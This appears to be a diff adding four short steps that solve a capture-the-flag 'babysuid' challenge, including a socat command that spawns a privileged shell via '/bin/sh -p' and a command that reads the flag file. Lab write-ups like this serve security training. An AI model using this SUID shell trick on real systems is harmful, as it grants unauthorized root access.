@@ -1,0 +1,4 @@
+1 Connect to terminal
+2 Read instructions : /challenge/babysuid
+3 Execute root shell : socat stdin exec:'/bin/sh -p'
+4 Read flag : cat /flag
